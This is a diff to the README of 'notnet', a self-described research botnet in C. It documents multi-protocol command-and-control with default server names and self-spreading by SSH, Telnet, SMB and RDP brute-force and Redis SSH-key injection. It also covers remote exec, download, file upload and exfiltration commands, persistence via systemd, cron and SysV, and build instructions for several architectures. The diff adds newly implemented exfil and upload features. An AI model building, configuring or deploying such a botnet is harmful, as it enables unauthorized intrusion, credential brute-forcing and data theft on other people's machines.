@@ -5,15 +5,17 @@ A research-purpose botnet written in pure C, designed to replicate across hetero
 ## Design Goals
 
 - **Pure C**: Compiles and runs on any system with a C compiler and network stack
-- **Hybrid C2**: Dual protocol support (IRC + HTTP/WebSocket) for maximum compatibility
+- **Hybrid C2**: Multi-protocol C2 (IRC + HTTP + WebSocket) for maximum compatibility
 - **Multi-vector spreading**: SSH, Telnet, SMB, Redis, RDP
 - **Peer-to-peer daisychain**: (planned, not yet implemented) — peer DNS
   discovery exists, but no peer relay or C2 fallback through peers yet
-- **Modern + classic**: On-target compilation, systemd persistence, alongside IRC command channels and brute-force spreading
+- **On-target compilation**: (planned, not yet implemented) — `payload_compile()`
+  exists but no embedded source tarball is shipped; updates are download-only
+- **Modern + classic**: systemd persistence, IRC command channels, and brute-force spreading
 
 ## Architectures
 
-The Makefile currently provides build targets for:
+The Makefile provides build targets for:
 
 - x86_64
 - ARM32 (armv7l)
@@ -25,11 +27,18 @@ repository build system. Do not treat them as available targets.
 
 ## C2 Protocols
 
-| Protocol  | Use Case |
-|-----------|----------|
-| IRC       | Legacy, low-overhead, NAT traversal via nick routing |
-| HTTP      | Modern, firewall-friendly, CDN-friendly (cleartext) |
-| WebSocket | Text-based C2, browser-dashboard compatible (cleartext) |
+| Protocol  | Status | Auth |
+|-----------|--------|------|
+| IRC       | Implemented | Nick allowlist (`irc_auth_nicks`) + optional `irc_pass` |
+| HTTP      | Implemented | Shared secret echo (`c2_secret`) — commands rejected without it |
+| WebSocket | Implemented (RFC 6455 handshake) | Shared secret echo (`c2_secret`) |
+
+- IRC commands are accepted only from nicks in the `irc_auth_nicks` allowlist.
+- HTTP and WebSocket commands are accepted only from responses that echo the
+  configured `c2_secret`. With no secret configured, HTTP/WS commands are
+  rejected (fail-closed).
+- All three channels support TLS 1.2+ when built with `make TLS=1` and a
+  certificate pin is configured (see Encryption).
 
 ## Spreading Vectors
 
@@ -38,25 +47,38 @@ repository build system. Do not treat them as available targets.
 | SSH     | Password brute-force, post-exploitation payload deployment (banner-based; effective against legacy/test services, not modern key-exchange SSH) |
 | Telnet  | Password brute-force, post-exploitation payload deployment (banner-based; effective against legacy/test services) |
 | SMB     | Login brute-force (auth confirmation only) |
-| Redis   | Unauthenticated write, SSH key injection |
+| Redis   | Unauthenticated write + authenticated brute-force, SSH key injection (`redis_ssh_key` required) |
 | RDP     | Brute-force, credential reuse (auth confirmation only) |
+
+The Redis SSH key injection vector requires a real SSH public key configured
+via `redis_ssh_key=` (config) or `NOTNET_REDIS_SSH_KEY` (env). The old literal
+placeholder is rejected.
 
 ## Payload Delivery
 
-1. Direct binary download from C2 (preferred), verified by SHA-256 pin
+1. Direct binary download from C2 (preferred), verified by a SHA-256 pin
+   (`payload_sha256=` config / `NOTNET_PAYLOAD_SHA256` env). Update is refused
+   without a pin or on hash mismatch (fail-closed).
 2. On-target compilation from embedded source tarball (planned, not yet implemented)
 
 ## Commands
 
-- **spread** — Scan and replicate to vulnerable hosts
-- **scan** — Port scan / service fingerprinting
-- **exec** — Execute shell command on remote
-- **download** — Download file from URL to target
-- **upload** — Upload file to target (not yet implemented)
-- **exfil** — Extract data from host (not yet implemented)
-- **update** — Fetch new binary from C2
-- **reboot** — Reboot target system
-- **status** — Report bot status to C2
+Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
+shared secret). The command queue is rate-limited to 10 commands/second.
+
+| Command | Syntax | Status |
+|---------|--------|--------|
+| spread  | `spread <ip>:<port>` | Implemented — brute-force a single host:port (22/23/445/6379/3389) |
+| scan    | `scan <subnet>` / `scan <ip>[:<port,...>]` | Implemented — port scan / service fingerprinting, results returned to C2 |
+| exec    | `exec <command>` | Implemented — runs one of a strict allowlist (`uname`, `date`, `uptime`, `whoami`, `id`, `ls`, `ifconfig`, `hostname`, `netstat`, `ps`), no shell |
+| download | `download <url> [path]` | Implemented — fetch URL to a local path |
+| upload  | `upload <path> [remote_path]` | Implemented — upload a file to the C2 |
+| exfil   | `exfil <path>` | Implemented — read a file and stream it to the C2 in chunks |
+| update  | `update [url]` | Implemented — download + SHA-256 verify + install new binary |
+| reboot  | `reboot` | Implemented — sync + reboot the target |
+| sleep   | `sleep <seconds>` | Implemented — set scan interval (clamped 1–3600) |
+| config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
+| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count |
 
 ## Configuration
 
@@ -72,16 +94,24 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `irc_enabled` | auto | 0/1 — explicitly enable/disable IRC C2 |
 || `http_server` | `api.notnet.net` | HTTP C2 server |
 || `http_port` | `443` | HTTP C2 port |
+|| `http_path` | `/api/v1/bot` | HTTP C2 path |
+|| `http_user_agent` | `notnet/<ver>` | HTTP User-Agent |
 || `http_enabled` | auto | 0/1 — explicitly enable/disable HTTP C2 |
 || `ws_server` | `ws.notnet.net` | WebSocket C2 server |
 || `ws_port` | `443` | WebSocket C2 port |
+|| `ws_path` | `/ws/v1/bot` | WebSocket C2 path |
 || `ws_enabled` | auto | 0/1 — explicitly enable/disable WS C2 |
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
+|| `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
 || `redis_ssh_key` | *(none)* | SSH public key injected into Redis authorized_keys (or `NOTNET_REDIS_SSH_KEY` env var) |
 || `scan_interval` | `30` | Seconds between scan cycles |
+|| `heartbeat_interval` | `60` | Seconds between heartbeats |
 || `ssh_enabled` | `1` | Enable SSH spreading |
 || `telnet_enabled` | `1` | Enable Telnet spreading |
+|| `smb_enabled` | `1` | Enable SMB spreading |
+|| `redis_enabled` | `1` | Enable Redis spreading |
+|| `rdp_enabled` | `1` | Enable RDP spreading |
 
 ### Scan targets
 
@@ -103,9 +133,9 @@ scan_target_1=10.0.0.0/24
 Control scan aggressiveness (defaults for production):
 
 | Key | Default | Description |
-|-----|---------|-------------|
-| `scan_timeout_ms` | `500` | Connection timeout in ms per host |
-| `scan_max_hosts` | `254` | Max hosts to scan per subnet |
+||-----|---------|-------------|
+|| `scan_timeout_ms` | `500` | Connection timeout in ms per host |
+|| `scan_max_hosts` | `254` | Max hosts to scan per subnet |
 
 For testing, use aggressive values:
 ```
@@ -122,12 +152,44 @@ Automatically detects init system and installs:
 - cron job
 - SysV init script
 
+Binary paths are validated against shell metacharacters before any installer
+uses them (CWE-78 hardening); the cron job is installed via a temp file, never
+shell interpolation.
+
 ## Encryption
+
 - TLS 1.2+ for all three C2 channels (IRC, HTTP, WebSocket), enabled with
   `make TLS=1` plus a pinned server certificate fingerprint:
   `tls_cert_pin_sha256=<64 hex>` in config or `NOTNET_TLS_CERT_PIN_SHA256`
-  env var. Without the pin the channels stay plaintext.
+  env var. The peer certificate is verified before any data is exchanged.
 - Default build is cleartext C2 (IRC, HTTP, WS).
+
+## Building
+
+```sh
+make            # static x86_64 build, cleartext C2
+make TLS=1      # dynamic build with OpenSSL TLS support
+make build-armv7l / build-aarch64 / build-riscv64   # cross builds
+make clean
+```
+
+Requires: a C compiler, `-lpthread`; `make TLS=1` additionally requires
+OpenSSL headers + `-lssl -lcrypto`.
+
+## Testing
+
+The repo ships a Docker-based test harness:
+
+```sh
+./tests/run-tests.sh no-net     # init + loop + shutdown, no network
+./tests/run-tests.sh mock-c2    # IRC + HTTP C2 against local mocks
+./tests/run-tests.sh all        # both scenarios
+```
+
+The mock scenario verifies IRC and HTTP command extraction, the shared-secret
+auth gate, exec allowlist execution, and spread dispatch. Rebuild the Docker
+image after any source change (`docker compose -f docker-compose.test.yml
+build bot-mock-c2`).
 
 ## License
 
